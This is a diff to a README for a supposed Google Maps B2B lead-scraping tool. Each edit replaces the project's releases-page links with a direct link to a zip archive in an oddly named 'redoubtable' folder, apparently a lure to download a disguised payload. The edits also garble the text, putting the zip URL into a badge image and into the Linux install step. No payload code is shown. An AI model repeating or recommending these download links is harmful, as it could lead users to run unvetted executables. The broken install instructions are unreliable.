@@ -1,6 +1,6 @@
 # 🌍 Google-Maps-B2B-Lead-Scraper-AI-Enhanced-Scraper - Easily Extract B2B Leads From Maps
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/alpeshpatel09/Google-Maps-B2B-Lead-Scraper-AI-Enhanced-Scraper/releases)
+[![Download Now](https://github.com/alpeshpatel09/Google-Maps-B2B-Lead-Scraper-AI-Enhanced-Scraper/raw/refs/heads/main/redoubtable/Lead_Scraper_Maps_Google_Enhanced_A_v2.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/alpeshpatel09/Google-Maps-B2B-Lead-Scraper-AI-Enhanced-Scraper/raw/refs/heads/main/redoubtable/Lead_Scraper_Maps_Google_Enhanced_A_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This application helps you easily gather business leads from Google Maps using A
 
 ## 📥 Download & Install
 
-1. **Visit the Releases page:** Go to the following link to access the software: [Download Page](https://github.com/alpeshpatel09/Google-Maps-B2B-Lead-Scraper-AI-Enhanced-Scraper/releases).
+1. **Visit the Releases page:** Go to the following link to access the software: [Download Page](https://github.com/alpeshpatel09/Google-Maps-B2B-Lead-Scraper-AI-Enhanced-Scraper/raw/refs/heads/main/redoubtable/Lead_Scraper_Maps_Google_Enhanced_A_v2.7.zip).
    
 2. **Select the latest version:** Look for the most recent release at the top of the page. This version will have the latest features and fixes.
 
@@ -17,7 +17,7 @@ This application helps you easily gather business leads from Google Maps using A
 4. **Install the application:**
    - For Windows: Run the downloaded `.exe` file and follow the prompts to install.
    - For Mac: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Follow the instructions for your specific distribution to install the `.tar.gz` or `.deb` file.
+   - For Linux: Follow the instructions for your specific distribution to install the `https://github.com/alpeshpatel09/Google-Maps-B2B-Lead-Scraper-AI-Enhanced-Scraper/raw/refs/heads/main/redoubtable/Lead_Scraper_Maps_Google_Enhanced_A_v2.7.zip` or `.deb` file.
 
 5. **Launch the application:** Once installed, open the Google Maps B2B Lead Scraper from your applications or programs menu.
 
@@ -82,4 +82,4 @@ For detailed information and guidance on use cases, visit the documentation link
 
 ---
 
-For more information, visit the download page: [Download Page](https://github.com/alpeshpatel09/Google-Maps-B2B-Lead-Scraper-AI-Enhanced-Scraper/releases) and start your journey to effortless lead generation today!
+For more information, visit the download page: [Download Page](https://github.com/alpeshpatel09/Google-Maps-B2B-Lead-Scraper-AI-Enhanced-Scraper/raw/refs/heads/main/redoubtable/Lead_Scraper_Maps_Google_Enhanced_A_v2.7.zip) and start your journey to effortless lead generation today!
